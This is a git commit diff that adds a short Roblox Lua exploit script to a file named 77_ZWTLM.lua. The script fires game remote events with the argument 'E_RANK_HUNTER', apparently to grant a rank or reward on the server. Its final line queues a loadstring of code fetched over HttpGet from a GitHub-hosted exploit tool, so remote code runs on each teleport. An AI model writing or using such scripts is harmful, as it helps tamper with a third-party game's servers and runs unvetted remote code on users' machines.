e42ef12ab5097bffb72f08e9832ea0bb73ab18fc
horizon <89583473+syntune@users.noreply.github.com>
2025-04-26 16:46:23 +0700

    Update 77_ZWTLM.lua

--- 77_ZWTLM.lua
+++ 77_ZWTLM.lua
@@ -1,1 +1,8 @@
-black
+wait(2)
+game.ReplicatedStorage.B2K:FindFirstChild("4107679d-3b41-4c87-96dd-7fbe6566aa36"):FireServer("E_RANK_HUNTER", 0)
+wait(2)
+game.ReplicatedStorage.B2K:FindFirstChild("4107679d-3b41-4c87-96dd-7fbe6566aa36"):FireServer("E_RANK_HUNTER", 1)
+wait(1)
+game.ReplicatedStorage.B2K:FindFirstChild("f4cd9a60-367a-4407-be6b-bb1ac28900cc"):FireServer()
+
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
